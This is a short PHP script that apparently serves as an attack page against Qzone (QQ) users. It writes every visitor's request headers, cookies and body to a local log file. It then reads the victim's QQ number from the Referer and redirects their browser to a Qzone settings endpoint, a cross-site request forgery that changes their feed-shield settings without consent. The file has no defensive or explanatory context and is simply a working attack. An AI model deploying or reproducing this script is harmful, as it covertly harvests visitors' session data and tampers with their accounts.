<?php

date_default_timezone_set('PRC');

$server = var_export($_SERVER, true);
$content = file_get_contents('php://input');
$time = date('Y-m-d H:i:s');

$log = <<<LOG
[{$time}]
SERVER:
{$server}

INPUT:
$content

---------------------------------------------------------------

LOG;

file_put_contents('query.log', $log, FILE_APPEND);

$qq = explode('/', $_SERVER['HTTP_REFERER'])[3] or exit;

header("Location: http://w.qzone.qq.com/cgi-bin/feeds/feeds2_shield_pannel_set?uin={$qq}&useutf8=1&applist=&uinlist=");

